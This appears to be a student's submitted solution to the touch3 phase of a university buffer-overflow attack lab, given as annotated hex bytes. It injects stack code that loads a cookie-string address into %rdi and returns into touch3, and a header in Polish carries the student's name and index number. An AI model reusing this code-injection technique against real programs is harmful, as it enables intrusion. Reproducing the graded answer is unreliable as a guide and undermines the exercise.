@@ -1,0 +1,15 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Artur Jankowski, 317928
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+48 c7 c7 88 a4 60 55    /* instrukcja mov $rsp+0x20, %rdi */
+68 5a 1c 40 00          /* instrukcja push - adres touch3 */
+c3 		                /* instrukcja ret */
+00 00 00                /* padding dla instrukcji */
+00 00 00 00 00 00 00 00 /* padding */
+68 a4 60 55 00 00 00 00 /* początek inputu */
+36 34 64 34 63 33 37 32 /* cookie jako string */
